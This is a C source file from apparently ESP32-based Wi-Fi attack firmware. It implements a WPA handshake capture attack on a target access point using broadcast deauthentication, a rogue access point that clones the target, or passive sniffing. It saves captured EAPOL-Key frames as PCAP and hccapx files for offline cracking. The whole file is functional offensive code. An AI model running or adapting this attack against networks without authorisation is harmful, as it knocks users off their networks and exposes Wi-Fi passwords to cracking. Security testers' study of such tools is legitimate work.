#include "attack_handshake.h"

#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "capture_session.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;

static void eapolkey_frame_handler(void *args, esp_event_base_t event_base,
                                   int32_t event_id, void *event_data) {
    const attack_status_t *status = attack_get_status();

    if (status == NULL || status->state != RUNNING || event_data == NULL) {
        return;
    }

    wifi_promiscuous_pkt_t *frame =
        (wifi_promiscuous_pkt_t *)event_data;

    ESP_LOGI(TAG, "Got EAPOL-Key frame");

    pcap_serializer_append_frame(
        frame->payload,
        frame->rx_ctrl.sig_len,
        frame->rx_ctrl.timestamp);

    hccapx_serializer_add_frame(
        (data_frame_t *)frame->payload,
        frame->rx_ctrl.sig_len);

    const bool hccapx_ready = hccapx_serializer_get() != NULL;

    capture_session_record_eapol(
        frame->rx_ctrl.sig_len,
        hccapx_ready,
        pcap_serializer_get_size());

    if (hccapx_ready) {
        ESP_LOGI(TAG, "Handshake candidate complete");

        capture_session_set_result(0, true);
        capture_session_finish(CAPTURE_SESSION_COMPLETE);

        attack_update_status(FINISHED);
        attack_handshake_stop();
    }
}

void attack_handshake_start(attack_config_t *attack_config) {
    if (attack_config == NULL || attack_config->ap_record == NULL) {
        ESP_LOGE(TAG, "Invalid handshake attack configuration");
        return;
    }

    ESP_LOGI(TAG, "Starting handshake capture...");
    method = attack_config->method;
    ap_record = attack_config->ap_record;

    if (pcap_serializer_init() == NULL) {
        ESP_LOGE(TAG, "Unable to allocate PCAP capture buffer");
        attack_update_status(FAILED);
        capture_session_finish(CAPTURE_SESSION_FAILED);
        return;
    }

    hccapx_serializer_init(
        ap_record->ssid,
        strnlen((const char *)ap_record->ssid, sizeof(ap_record->ssid)));

    wifictl_sniffer_filter_frame_types(true, false, false);

    ESP_ERROR_CHECK(esp_event_handler_register(
        FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        &eapolkey_frame_handler,
        NULL));

    frame_analyzer_capture_start(
        SEARCH_HANDSHAKE,
        ap_record->bssid);

    wifictl_sniffer_start(ap_record->primary);

    switch (attack_config->method) {
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast(ap_record, 5);
            break;

        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            attack_method_rogueap(ap_record);
            break;

        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            break;

        default:
            ESP_LOGE(TAG, "Unknown handshake method");
            attack_handshake_stop();
            attack_update_status(FAILED);
            capture_session_finish(CAPTURE_SESSION_FAILED);
            return;
    }
}

void attack_handshake_stop() {
    switch (method) {
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;

        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;

        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            break;

        default:
            break;
    }

    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();

    ESP_ERROR_CHECK(esp_event_handler_unregister(
        FRAME_ANALYZER_EVENTS,
        DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        &eapolkey_frame_handler));

    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake capture stopped");
}
